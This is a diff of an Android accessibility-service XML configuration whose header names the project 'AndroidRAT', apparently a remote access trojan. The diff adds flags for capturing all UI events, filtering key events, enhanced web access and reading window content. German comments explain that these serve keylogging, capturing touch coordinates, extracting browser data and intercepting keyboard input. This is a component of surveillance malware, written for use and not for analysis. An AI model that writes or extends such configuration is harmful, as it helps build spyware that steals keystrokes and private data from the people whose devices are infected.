@@ -1,8 +1,32 @@
-<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+<?xml version="1.0" encoding="utf-8"?>
+<!-- 
+    AndroidRAT Accessibility Service Konfiguration
+    Version 2.0 - Android 15 (API Level 35) optimiert
+    September 2025
+-->
+<accessibility-service 
+    xmlns:android="http://schemas.android.com/apk/res/android"
     android:description="@string/accessibility_service_description"
     android:accessibilityEventTypes="typeAllMask"
+    android:accessibilityFlags="flagDefault|flagReportViewIds|flagRequestTouchExplorationMode|flagRequestEnhancedWebAccessibility"
     android:accessibilityFeedbackType="feedbackGeneric"
     android:notificationTimeout="100"
     android:canRetrieveWindowContent="true"
-    android:settingsActivity="com.example.client.MainActivity"
-    />
+    android:canRequestTouchExplorationMode="true"
+    android:canRequestEnhancedWebAccessibility="true"
+    android:canRequestFilterKeyEvents="true"
+    android:settingsActivity="com.example.client.MainActivity" />
+
+<!-- 
+    Erklärung der Flags (Android 15):
+    
+    typeAllMask: Erfasst alle UI-Events (Keylogging, Screen-Interaktionen)
+    flagReportViewIds: Ermöglicht Identifikation von UI-Elementen
+    flagRequestTouchExplorationMode: Touch-Event-Erfassung
+    flagRequestEnhancedWebAccessibility: WebView-Zugriff
+    
+    canRetrieveWindowContent: Vollständiger Zugriff auf Fensterinhalte
+    canRequestTouchExplorationMode: Touch-Koordinaten erfassen
+    canRequestEnhancedWebAccessibility: Browser-Daten extrahieren
+    canRequestFilterKeyEvents: Tastatureingaben abfangen
+-->
